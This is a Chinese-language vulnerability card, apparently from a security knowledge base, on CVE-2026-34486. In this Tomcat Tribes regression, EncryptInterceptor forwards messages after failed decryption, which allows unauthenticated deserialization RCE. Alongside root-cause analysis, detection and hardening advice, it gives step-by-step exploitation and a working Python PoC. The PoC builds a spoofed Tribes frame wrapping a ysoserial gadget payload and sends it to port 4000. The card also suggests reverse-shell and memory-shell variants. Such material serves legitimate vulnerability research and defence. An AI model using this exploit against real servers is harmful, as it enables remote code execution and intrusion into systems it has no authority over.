---
id: web-java-component-tomcat-tribes-encryptinterceptor-deserialization-rce
title: Tomcat Tribes EncryptInterceptor 解密失败仍转发导致未授权反序列化 RCE（CVE-2026-34486）
type: scenario
domain: web
path: web/java/component/tomcat
technique: tribes-encryptinterceptor-failed-decrypt-forward-rce
aliases:
- CVE-2026-34486
- Tomcat Tribes RCE
- EncryptInterceptor 解密失败绕过
- Tomcat 集群 4000 端口反序列化
- Tribes 未授权反序列化
- CVE-2026-29146 后继漏洞
tags:
- java
- tomcat
- tribes
- cluster
- deserialization
- rce
- encrypt-interceptor
- unauthenticated
- intranet
- cve-2026-34486
cve:
- CVE-2026-34486
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: Tomcat 9.0.116、10.1.53、11.0.20（原文：这些为修复 CVE-2026-29146 的版本，因重构引入本漏洞；9.0.117 已修复）
verification:
  verified_by: verifier-V33
  verified_at: '2026-11-05T06:10:59+08:00'
  notes: 已对照原文与5张截图核对：CVE-2026-29146 补丁（9.0.116/10.1.53/11.0.20）重构把 super.messageReceived(msg) 移到 try 外、解密失败仅记日志仍转发，原理与截图一致；Tribes 帧 FLT2002/TLF2003/TRIBES-B/E 与成员结构、PoC 发送成功、9.0.117 挪回 try 均与原文一致。注意 img04 显示原文复现场景最终被腾讯云 RASP 拦截（SecurityException），未展示真实命令回显，卡片在防御段已注明被 RASP 拦截，触发到 ObjectInputStream.readObject 已证明、最终 RCE 为 CVE 语义与链推论；受影响版本按原文/图01 标记正确，已设置无需调整；未在本机复现
---

## 一句话结论

Tomcat 9.0.116 / 10.1.53 / 11.0.20 的 Tribes `EncryptInterceptor.messageReceived()` 把 `super.messageReceived(msg)` 移到 `try` 块外，解密失败只记日志而不终止流程；攻击者向集群监听端口（默认 4000）发送一个明文 Java 序列化 payload 的 Tribes 协议帧，即可让消息无过滤进入 `ObjectInputStream.readObject()`，实现未授权 RCE。

## 原理

- Tomcat 集群通过 Tribes 在节点间同步 Session 等状态，默认由 `NioReceiver` 监听 4000 端口，消息沿拦截器链传递：`EncryptInterceptor` → `TcpFailureDetector` → `MessageDispatchInterceptor` → `GroupChannel`/`ClusterSessionListener`。
- `EncryptInterceptor` 负责节点间加密（AES/CBC 或 GCM）。正常逻辑应在解密失败时丢弃消息，不把不可信数据交给后续链。
- 漏洞版本中，`messageReceived()` 的结构变成：
  - `try { data = decrypt(msg); xbb.clear(); xbb.append(data); }`
  - `catch (GeneralSecurityException gse) { log.error(...); }`
  - `super.messageReceived(msg);` 位于 `try/catch` **之外**。
- 攻击者发送明文序列化流时，`decrypt()` 因块大小/填充不合法抛出 `GeneralSecurityException`，`catch` 只打印 "Failed to decrypt message"，没有 `return`/`throw`；随后 `super.messageReceived(msg)` 仍被执行，原始消息（攻击者的明文 `ac ed 00 05...`）继续下发。
- 下游 `GroupChannel`/`ClusterSessionListener` 使用未配置 `ObjectInputFilter` 的原生 `ObjectInputStream.readObject()` 反序列化该消息体，classpath 上的 gadget 链即被执行。
- 该漏洞是 CVE-2026-29146 修复的回归：CVE-2026-29146 是旧版 AES/CBC/PKCS5 解密错误差异形成的 padding oracle/时序侧信道；官方改用 GCM 时重构了 `messageReceived()`，把转发语句移出 try，反而引入更直接的未授权 RCE。
- Tribes 协议帧的合法性由外层 `FLT2002 ... TLF2003` 标记、`ChannelData` 结构和一个伪造的 `MemberImpl`（`TRIBES-B`/`TRIBES-E` 包裹）共同满足，节点会把它当作集群兄弟节点的正常消息。

## 触发条件

- 目标 Tomcat 开启 Tribes 集群（`<Cluster>` + `GroupChannel`），`NioReceiver` 监听可访问的 4000 端口（或配置的其他端口）。
- 目标版本为漏洞版本（9.0.116、10.1.53、11.0.20），且集群配置了 `EncryptInterceptor`（漏洞位于该拦截器；未配置加密拦截器时明文反序列化同样可打，但属于另一类配置暴露）。
- 攻击者能访问集群端口；该端口通常位于内网，因此更常见的入口是内网横向、SSRF 或边界暴露。
- 目标 classpath 存在可用 gadget 链（如 CommonsCollections 3.2.1 + `TemplatesImpl`），或应用自带危险 `readObject` 类。

## 利用步骤

1. 探测 4000 端口与 Tribes 服务：连接后观察是否有响应/关闭行为；结合 Tomcat 版本与 `server.xml` 泄露确认集群配置。
2. 生成 Java 原生序列化 payload（如 ysoserial 的 CC 链）；payload 必须以 `ac ed 00 05` 开头。
3. 按 Tribes 帧格式封装：
   - `FLT2002`（7 字节）+ 4 字节大端长度 + `ChannelData` + `TLF2003`（7 字节）。
   - `ChannelData`：options（4 字节，常用 0x0008）、timestamp（8 字节）、unique id 长度+16 字节 id、member 长度+member、message 长度+序列化 payload。
   - `MemberImpl`：`TRIBES-B\x01\x00` + 4 字节 body 长度 + body + `TRIBES-E\x01\x00`；body 含 alive_time、port、secure_port、udp_port、IP、payload_len、domain_len、16 字节 unique_id、local flag。
4. 建立 TCP 连接发送整帧，关闭写端。
5. 服务端 `decrypt()` 失败 → `catch` 记录错误 → `super.messageReceived()` 放行 → 下游 `readObject()` 触发 gadget，命令以 Tomcat 进程用户执行。
6. 验证：使用 DNSLog/回连或写文件确认命令执行；失败时检查目标是否已升级、是否未挂载 EncryptInterceptor、classpath 是否有链。

## PoC

```python
import io, socket, struct, time

FRAME_HEADER, FRAME_FOOTER = b"FLT2002", b"TLF2003"
MEMBER_BEGIN, MEMBER_END = b"TRIBES-B\x01\x00", b"TRIBES-E\x01\x00"

def build_member():
    p = io.BytesIO()
    p.write(struct.pack(">qIII", 0, 4001, 0, 0))      # alive_time, port, secure_port, udp_port
    ip = socket.inet_aton("127.0.0.1")
    p.write(struct.pack(">B", len(ip)) + ip)
    p.write(struct.pack(">II", 0, 0))                 # payload_len, domain_len
    p.write(b"\x01" * 16)                             # unique_id
    p.write(struct.pack(">I", 0))                     # local flag
    body = p.getvalue()
    return MEMBER_BEGIN + struct.pack(">I", len(body)) + body + MEMBER_END

def build_packet(payload):
    member = build_member()
    ct = io.BytesIO()
    ct.write(struct.pack(">IQ", 0x0008, int(time.time() * 1000)))  # options, timestamp
    uid = b"\xde\xad\xbe\xef" * 4
    ct.write(struct.pack(">I", len(uid)) + uid)
    ct.write(struct.pack(">I", len(member)) + member)
    ct.write(struct.pack(">I", len(payload)) + payload)
    data = ct.getvalue()
    return FRAME_HEADER + struct.pack(">I", len(data)) + data + FRAME_FOOTER

payload = open("cc.bin", "rb").read()   # Java 序列化流，以 ac ed 00 05 开头
s = socket.create_connection(("target", 4000), timeout=5)
s.sendall(build_packet(payload))
s.close()
```

```text
[服务端预期日志]
SEVERE: Failed to decrypt message
java.lang.IllegalBlockSizeException: ...
# 随后消息仍被转发，进入 readObject，gadget 执行
```

## 变体与关联

- 变体：未配置 `EncryptInterceptor` 的集群直接接受明文序列化流，无需触发解密失败；这类部署同样可 RCE，但根因是缺少加密拦截器而非本 CVE。
- 变体：CVE-2026-29146（9.0.115 及更早）的 AES/CBC 填充错误与深层解析错误存在可区分时序，可做 padding oracle/侧信道；本文未给出完整利用，仅作为本漏洞的前置背景。
- 变体：把 payload 换成写内存马、反弹 shell 或其他 gadget 链，取决于目标 classpath；`TemplatesImpl` 链在 Tomcat 中常见。
- 关联：[[web-java-deser-commonscollections-cc1-transformedmap]]、[[web-java-deserialization-custom-readobject-runtime-exec]]（payload 侧）；同目录其他 Tomcat 内存马卡可作为 RCE 后的驻留方式。
- 边界：目标已升级到 9.0.117 或对应修复版本、4000 端口不可达、或下游配置了 JVM `jdk.serialFilter` 拦截 gadget 类时，本链失败。

## 检测与防御

- 检测：资产测绘中暴露的 Tomcat 4000/集群端口；网络流量中出现 `FLT2002`/`TLF2003`、`TRIBES-B` 魔数且随后跟随 `ac ed 00 05`；Tomcat 日志出现 `Failed to decrypt message` 紧接着反序列化异常/类加载；Java 进程异常 `execve`（auditd/eBPF/EDR）。
- 修复：升级到已修复版本（9.0.117 已把 `super.messageReceived()` 移回 try 块；10.1/11.0 按官方公告升级）；确认 `EncryptInterceptor` 使用 AES/GCM。
- 加固：集群通信端口只绑定内网/回环并加防火墙，禁止从不可信网络访问；为 JVM 配置 `-Djdk.serialFilter=<白名单>` 或使用 provider 级过滤器；不需要集群时关闭 Tribes；用 RASP/主机防护检测反序列化利用（文中示例即被云工作负载防护的 RASP 拦截）。
